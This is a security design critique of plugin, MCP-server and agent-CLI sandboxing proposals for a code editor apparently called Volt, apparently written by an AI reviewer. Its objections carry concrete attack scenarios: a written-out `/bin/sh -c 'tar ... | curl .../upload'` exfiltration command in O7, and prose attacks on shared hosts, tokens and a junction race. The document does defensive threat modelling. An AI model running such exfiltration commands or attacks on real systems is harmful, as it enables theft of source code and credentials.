# Sol: round-2 critique

Lens: network broker, MCP servers, agent CLIs, and desktop/web/phone remote operation.

I checked the disputed implementation claims against `main` and `feat/volt-sandbox`. In particular, the branch intentionally omits `allowedDomains` from `sandboxLaunchKey` because the proxy is live-mutable (`feat/volt-sandbox:src/vs/platform/voltSandbox/common/sandboxPolicy.ts:522-530`), while `allowSandboxDomains` currently only forwards to an existing launch (`feat/volt-sandbox:src/vs/platform/voltStdio/node/voltStdioService.ts:219-221`). The server extension host is still a plain `cp.fork(bootstrap-fork)` (`main:src/vs/server/node/extensionHostConnection.ts:270-277`). Remote pairing tokens currently carry only `owner | device`, not capability scopes or recent-auth state (`main:src/vs/server/node/voltAgent/serverPairing.ts:30-39,202-209`).

## 1. Strongest objections

### O1 — `claude-a` §2.2: a process-per-publisher cannot provide per-plugin identity

**Claim:** T2 uses one OS-sandboxed process per publisher, one SES worker per plugin, and the core binds identity to the process channel. Plugins from the same publisher may share because they have one signer.

**Why it fails:** the channel identifies the publisher process, not the plugin. After one SES escape, the attacker can emit any RPC available to every worker in that process. A payload `pluginId` cannot repair this because the compromised process can forge it. Sharing a signer does not mean sharing authority: `volt.usage`, `volt.memory`, and a provider plugin should have different ceilings even though all are signed by Volt.

**Concrete attack:** a parser bug in `volt.usage` escapes its Compartment, observes or injects another worker's messages, then invokes the secrets broker as `volt.provider-claude` or registers a memory hook as `volt.memory`. The core sees the valid `volt` publisher channel and applies the union of that host's grants. The proposed OS sandbox does nothing because the attack stays on the authorized RPC fd.

**Required correction:** one principal per process/channel for T2 and T3. If resource measurements force co-hosting, every co-hosted plugin must have the exact same effective grant set and compromise domain; that optimization must never apply to unrelated first-party plugins.

### O2 — `claude-a` §9.1: public `*` network for unmanifested T3 extensions defeats the broker

**Claim:** an existing VS Code extension with no Volt manifest gets workspace read/write and proxy access to every public host, with logging.

**Why it fails:** logging is detection after exfiltration. The two permissions needed to steal source are workspace read and one attacker-controlled public HTTPS endpoint; this default grants both without a prompt or declaration.

**Concrete attack:** a compromised formatter update walks the workspace, compresses source and `.env` files that were missed by a pattern edge case, and uploads them to `https://collector.example`. Even if credential denies work perfectly, private source is gone. It can use a fresh domain, so a reputation list does not help.

**Required correction:** no network by default for an unknown extension. Ship signed compatibility presets for common extensions, prompt from a concrete denied destination, and offer an explicit compatibility mode that says it permits arbitrary public exfiltration. Never call `public *` the sandboxed default.

### O3 — `claude-a` §4 and `claude-b` §§2/4: SES-only T2 on old Windows is not an acceptable first-party fallback

**Claim:** first-party T2 may run on unsupported Windows with SES and Node's permission model but no OS sandbox; `claude-b` also allows third-party VS Code extensions to run fully unsandboxed after acknowledgement.

**Why it fails:** SES and Node permissions are defense-in-depth inside the same V8/Node process, not a user boundary. A compromised first-party update is one of the stated attackers. Labelling the run `partial` does not contain it.

**Concrete attack:** a malicious dependency in a signed provider plugin exploits a V8 or SES endowment bug, reaches Node internals, reads the volt-server token and provider credentials, then opens a normal socket as the logged-in user. There is no WFP, ACL, AppContainer, or alternate-user boundary to stop it.

**Required correction:** on Windows below the MXC floor, refuse code that requires an OS boundary. An optional sandbox-user backend may be offered after explicit installation and successful probe. “Run outside sandbox” is a per-run emergency override, never a tier silently described as partially sandboxed.

### O4 — `terra` §§2, 12 PR 18: the shared “untrusted pool” recreates the stock extension-host failure

**Claim:** T3 gets one extension host per publisher up to a cap of eight; further publishers share an untrusted pool.

**Why it fails:** the ninth extension is not less hostile than the first eight. A shared Node extension host permits memory inspection, monkey-patching, command interception, and use of the broadest OS policy needed by any member. The pool also destroys channel-bound identity.

**Concrete attack:** publisher nine's extension patches `Module._load` or VS Code RPC stubs, captures publisher ten's SecretStorage request, and uses publisher ten's granted GitHub/network access. The OS sees one allowed process. The “untrusted” label changes no enforcement.

**Required correction:** never pool mutually untrusted T3 extensions. Use lazy hosts, idle eviction, process budgets, and an explicit refusal when the budget is exhausted. A lower-RSS shared pool is not a security tier.

### O5 — `grok` §4.1: the sandbox-user backend is specified as a fallback without specifying its privileged broker

**Claim:** an elevated setup creates a shared local user, WFP rules and ACLs; runs use `CreateProcessWithLogonW`, and this backend is automatically selected when MXC is unsupported or the image is MSYS/Cygwin.

**Why it fails:** this introduces a SYSTEM/elevated service that can mint logon tokens, alter WFP, and grant the sandbox SID access to arbitrary paths. The proposal specifies workload confirmation but not the service's caller authentication, request grammar, ACL transaction/rollback, path reparse-point handling, or crash recovery. A long-lived shared SID also lets stale ACLs accumulate across runs.

**Concrete attack:** a malicious repo races a workspace path to a junction after validation but before the elevated service adds an ACL. The service grants the shared sandbox SID access to a credential directory. A later, unrelated sandbox-user run inherits that stale grant. Alternatively, an unprivileged local process calls an inadequately authenticated setup endpoint to request a permissive WFP rule.

**Required correction:** sandbox-user is an explicit, separately threat-modelled optional backend—not an automatic recovery path. It needs a narrow authenticated service protocol, per-launch capability token, reparse-safe handle-based ACL operations, a rollback journal, stale-ACL cleanup, and adversarial tests before `auto` can select it.

### O6 — `claude-b` §3.5: putting every grant in the launch key contradicts live network grants

**Claim:** the launch key includes every grant so a process is never reused across different grants, while network grants are also applied live.

**Why it fails:** immutable OS grants and mutable broker grants are different state. The branch deliberately leaves allowed domains out of `sandboxLaunchKey`; otherwise “Allow host” restarts the agent rather than updating its proxy. A single all-grants key makes the lifecycle ambiguous and invites callers to kill a healthy process after a network-only change.

**Concrete failure:** a user allows `api.example.com` while an agent CLI is streaming. Storage changes the launch key, the reuse layer replaces the CLI, and the in-process ACP conversation and child MCP servers disappear. If another caller instead reuses the old key, persisted state and proxy state disagree after restart.

**Required correction:** use two epochs: `launchPolicyHash` for mounts, env, process and IPC; `brokerGrantEpoch` for network and broker handles. Persist grants, replay them into the same proxy, and never restart solely for a hostname grant.

### O7 — `terra` §6.3: provider-supplied launch specs remain a process confused deputy

**Claim:** provider extensions return `{command, args, env, policyHints}` and therefore cannot start an unsandboxed process because core performs the launch.

**Why it fails:** moving `spawn` into core is necessary but insufficient. If untrusted provider code chooses the executable, arbitrary args, non-secret environment, and policy hints, core is still a generic process-execution deputy. The current agent profile intentionally has broad workspace access and may have provider credential directories.

**Concrete attack:** a malicious “model provider” returns `/bin/sh -c 'tar ... | curl https://api.vendor.example/upload'`, names its own attacker-controlled host as the vendor endpoint, and asks for an agent-compatible broad profile. Core launches it sandboxed, but the requested operation is fully inside the broad grant.

**Required correction:** provider manifests select a core-known executable identity and a typed argument template. Core resolves and pins the binary, owns sandbox layers, strips arbitrary env, and treats provider policy hints as narrow-only. A third-party provider that needs arbitrary process execution is a T3 plugin with an explicit critical grant, not a normal provider.

### O8 — `claude-a` §§2.1/8.4 and `terra` §8.3: “server-owned grants” is incomplete for web and phone

**Claim:** placing hosts and the grant store on volt-server gives desktop, web and phone one consistent permission truth, with no extra work.

**Why it fails:** authority location and authorization policy are separate. Existing pairing proves a device token and exposes only `owner | device`; it has no capability scopes, grant nonce, recent-auth marker, or local-presence requirement. A remote client must not automatically gain the right to widen a server-side plugin or choose “Run outside sandbox.”

**Concrete attack:** a stolen long-lived phone token connects through a tunnel and approves `net.local`, workspace write, or an unsandboxed launch on the developer's server. The resulting process runs beside the user's credentials even though nobody at the host confirmed the escalation.

**Required correction:** the server remains the sole grant authority, but remote requests carry device identity and are policy-checked. Low-risk session grants may be approved by an `owner`; local-network, secret use, process execution, persistent grants, and “outside sandbox” require recent step-up and, by default, confirmation from a local owner session. Device tokens need scopes and expiry.

### O9 — `claude-a` §7: one release key and a seven-day stale warning are too weak for first-party plugin updates

**Claim:** use a release/CI key, potentially the same key as the desktop build, pin it in the app, and let installed plugins keep running when revocation cannot be fetched.

**Why it fails:** the proposal's own fallback collapses core signing and plugin signing into one online credential. Compromising that workflow signs both code and its authority. A stale revocation warning does not protect against rollback or a malicious feed.

**Concrete attack:** a compromised release workflow signs a malicious `volt.usage` with its existing capabilities and rewrites the update metadata. Offline users continue running it after revocation because there is no expiry-enforced trusted metadata or rollback protection.

**Required correction:** adopt `claude-b`'s protected release environment and TUF-style root/targets/snapshot/timestamp separation. Use a distinct first-party plugin delegation, capability ceilings in core, monotonic metadata, and an emergency revoke-only key. Availability policy may fail open for an already verified installed version, but it must not accept new or rolled-back metadata while stale.

### O10 — `claude-a` §2.1 and `terra` §§0/2: a facade plus lint does not contain in-process “plugins”

**Claim:** T1/T0p code can remain in the renderer or core processes and be treated as a plugin because it uses a capability-checked facade enforced by import lint.

**Why it fails:** lint constrains reviewed source, not runtime authority. In-process code can use ambient DOM, module loading, globals, existing service references, and dependencies that never call the facade. This is modularity, not a sandbox boundary.

**Concrete attack:** an injected dependency in an in-process visuals renderer reads transcript DOM and calls browser APIs directly, or obtains an existing service through module imports hidden in generated code. No RPC check runs because there is no boundary.

**Required correction:** call these components trusted core modules, not sandboxed plugins. Keep them few, lazy and linted, isolate agent-authored content in opaque iframes, and move native power into narrow authenticated helpers. “Everything is a plugin” may describe lifecycle and contribution APIs; it must not imply isolation where none exists.

## 2. Concessions and adopted ideas

1. **From `claude-b`: signed ceilings and caller attenuation.** First-party capabilities are declared, auto-granted within a core-compiled ceiling, and intersected with the calling chat/device policy on every RPC. This is stronger than my round-1 “signed manifest” alone.
2. **From `claude-b`: distribution security is prerequisite work.** Protected signing environments, provenance, a reserved `volt.*` namespace, TUF-style metadata, signer continuity, rollback protection and load-time file verification belong before a third-party marketplace.
3. **From `grok`: no silent backend fallback.** Probe and confirm failures kill and refuse. Windows backend selection is made before launch from OS/build/image facts. A failed MXC trial never triggers an unsandboxed or alternate-backend retry.
4. **From `grok`: environment and IPC hardening.** `NODE_CHANNEL_FD`, `NODE_OPTIONS`, `VSCODE_*`, `ELECTRON_*` and proxy credentials are launcher-owned. Policy layers cannot set them. The inherited fd is the authority.
5. **From `claude-a`: the API and migration inventory.** Its 30-row map and namespaced `volt.*` API are the best concrete migration substrate. Declarative contributions and brokered secret references should be adopted, subject to per-process principal isolation.
6. **From `terra`: sequence and verification discipline.** Merge/harden the existing agent sandbox first, build the facade in parallel, add a spawn audit, and do one reversible feature migration per PR. The CI matrix and explicit refusal jobs are the right shape.
7. **From `terra`: remote kill switches may only move `enforce → ask`.** They must never silently disable confinement.
8. **From all proposals: live filesystem widening is a broker operation, not a profile mutation.** Seatbelt and bwrap profiles are fixed at launch; persistent raw-mount changes require a relaunch.

## 3. Revised positions

| Disputed decision | Revised position | Consequence / non-negotiable test |
|---|---|---|
| **Windows backend** | MXC ProcessContainer via pinned, Authenticode-verified `wxc-exec` is primary on supported Windows 11. Below the floor and for known MXC-incompatible MSYS/Cygwin images, refuse by default. Offer a separately installed sandbox-user backend only after its privileged broker, ACL rollback and WFP isolation pass review; never select it after an MXC probe/confirm failure. | Windows 10 without the optional backend refuses. `wsl.exe` refuses. Git Bash either uses a preselected proven backend or refuses. No launch is retried under a weaker backend. |
| **First-party “allow all”** | Reject literal allow-all and `sandbox:false`. Use signed, declared capabilities, auto-granted with zero prompts only when requested capabilities are within a core-compiled per-plugin ceiling. Effective rights per call are `plugin ceiling ∩ caller rights ∩ user/admin policy`. | A compromised `volt.usage` cannot acquire terminal, chat-control or arbitrary secret-read rights merely because it is signed by Volt. Capability growth needs a core-ceiling update. |
| **Host tiers** | T0 is trusted core and brokers. In-process feature packages are explicitly T0 modules, not isolation tiers. T2 is one OS-sandboxed SES process per plugin principal. T3 is one OS-sandboxed Node extension host per extension principal; no publisher sharing and no untrusted pool. MCP and agent CLIs are separate long-lived principals. T4 is opt-in microVM. | Identity is bound to one launch/channel. An SES or Node escape reaches only that principal's OS policy and grants. Lazy start/idle eviction handles memory pressure; exhaustion refuses instead of pooling. |
| **Migration order** | Land and harden `feat/volt-sandbox`, live network grants, listener auth and long-lived host support first. Build the Volt API facade and manifests in parallel in audit mode. Move provider data early, but move executable code only after its target host is confirmed sandboxed. Migrate one feature per PR; deep in-process UI is fenced as T0 until it can be honestly isolated. | No code moves from trusted `contrib` into today's unsandboxed `cp.fork`/`utilityProcess` and gets called “safer.” Main remains shippable after every PR. |
| **Network broker** | One proxy per principal, plus an unforgeable `Proxy-Authorization` token. Default is no network for T2/T3/MCP; signed compatibility presets may pregrant exact hosts. Proxy owns DNS, pins the checked public address, denies loopback/private/metadata, TCP only, no TLS interception. Network grants are live and keyed separately from immutable launch policy. `public *` and `host` are critical compatibility modes. | A grant to A never works from B; revoke closes new connections and, where practical, existing tunnels. “Allow host” changes no PID. UDP/QUIC fail. Domain fronting remains a documented residual, not a claim solved by SNI peeking. |
| **MCP and agent CLIs** | Every stdio MCP server and agent CLI is a long-lived SandboxManager principal. Repo MCP requires Workspace Trust. Pin MCP tool name/description/schema hashes and re-consent on changes; namespace tools. Remote HTTP MCP uses brokered OAuth/secret refs and per-server network identity. Agent CLIs run with nested native sandboxes disabled only when Volt has confirmed its own backend. Provider manifests may choose only core-approved executable identities and narrow policy. | A malicious MCP cannot reach host loopback or mutate tool definitions after approval. A provider cannot turn `volt.exec` into arbitrary `/bin/sh`. Tool calls are attenuated to the invoking chat. |
| **Remote server / web / phone** | The execution host's volt-server is the sole policy and grant authority. Clients display requests; they do not mutate proxy state directly. Device tokens are scoped, expiring identities. Persistent/high-risk grants, local-network access, secret use, process execution and “Run outside sandbox” require recent step-up; default policy requires local-owner confirmation for remote escalation. | Stealing a paired phone token cannot widen a server plugin or start an unsandboxed process. Every audit event records device, user/session, principal, target and grant epoch. |
| **Signing and updates** | App/platform signing is the outer layer; TUF-style metadata is the update authority. Offline threshold root, protected online release target key, distinct first-party-plugin delegation, revoke-only role, provenance, rollback/freeze protection, publisher-key continuity, load-time file hashing, and reserved `volt.*`. Dev/unpacked code is always third-party-scoped and visibly unsigned. Playground code receives no first-party trust. | A feed rewrite plus a valid hash is insufficient. A plugin signer change drops grants. A stale client may keep a previously verified installed version according to policy, but cannot install new or rolled-back metadata. |

## 4. Bottom line

The synthesis should not trade principal isolation for process count. The reference monitor can only enforce an identity it derives from a launch/channel it owns. Publisher grouping, shared untrusted pools, payload-supplied plugin ids, and remote clients directly mutating grants all erase that property.

The practical architecture is therefore: harden the existing agent boundary first; make each executable plugin/MCP/CLI a separately confirmed principal; keep network and secrets behind identity-bound brokers; make the server authoritative but require step-up for remote escalation; and treat signing as the source of a bounded ceiling, never as permission to bypass enforcement.
